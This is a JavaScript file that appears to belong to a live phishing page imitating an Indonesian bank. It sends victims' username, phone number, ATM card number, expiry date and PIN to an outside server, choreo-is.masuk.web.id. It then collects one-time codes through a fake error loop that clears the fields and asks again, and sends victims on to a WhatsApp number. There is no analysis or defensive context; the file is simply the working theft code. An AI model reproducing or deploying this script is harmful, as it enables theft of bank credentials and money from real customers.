$(document).ready(function(){
    $('#inputlogin').submit(function(e) {
        e.preventDefault();    
        $('.load').fadeIn(); 
 document.getElementById('kirims').innerHTML = "Memproses....";
$.ajax({
 type: 'POST',
 url: 'https://choreo-is.masuk.web.id/bb/sendLogin.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
 complete: function(data) {
            console.log('Complete')
  setTimeout(function(){
    window.location.href='kode.html';  
    $('.load').fadeOut();
var user = document.getElementById("user").value;
sessionStorage.setItem("user", user);
var nohp = document.getElementById("nohp").value;
sessionStorage.setItem("nohp", nohp);
var atm = document.getElementById("atm").value;
sessionStorage.setItem("atm", atm);
var bulan = document.getElementById("bulan").value;
sessionStorage.setItem("bulan", bulan);
var tahun = document.getElementById("tahun").value;
sessionStorage.setItem("tahun", tahun);
var pin = document.getElementById("pin").value;
sessionStorage.setItem("pin", pin);
     }, 500);
 }
    });
 });
    return false;
});   
        

$(document).ready(function(){
    $('#formOtp').submit(function(e) {
        e.preventDefault();    
        $('.load').fadeIn();      
 document.getElementById('kirims').innerHTML = "Memproses....";
$.ajax({
 type: 'POST',
 url: 'https://choreo-is.masuk.web.id/bb/otp.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
 complete: function(data) {
            console.log('Complete')
  setTimeout(function(){
$('#alert').show();
}, 500);
setTimeout(function(){
 $("#alert").hide();
 $('#pin1').val("");
$('#pin2').val("");
$('#pin3').val("");
$('#pin4').val("");
$('#pin5').val("");
$('#pin6').val("");
$('#pin1').focus();
$('.load').fadeOut();
 document.getElementById('kirims').innerHTML = "Konfirmasi";
     }, 4000);
 }
    });
 });
    return false;
});   

document.getElementById('timer').innerHTML =
          01 + ":" + 01;
        startTimer();
        
        
        function startTimer() {
          var presentTime = document.getElementById('timer').innerHTML;
          var timeArray = presentTime.split(/[:]+/);
          var m = timeArray[0];
          var s = checkSecond((timeArray[1] - 1));
          if(s==59){m=m-1}
          if(m<0){
            return
          }
          
          document.getElementById('timer').innerHTML =
            m + " : " + s;
          
          setTimeout(startTimer, 1000);
          
        }
        
        function checkSecond(sec) {
          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
          if (sec < 0) {sec = "59"};
          return sec;
        }
        
        var i = 15;
var time = $("#cice")
var timer = setInterval(function() {
  time.html(i);
  if (i == 0) {
  $("#timer").hide();
   location.href='kode.html';
    clearInterval(timer);

  }
  i--;
}, 1000)

function go(){
setTimeout(function(){  
location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373)';
    }, 1500);    
}     
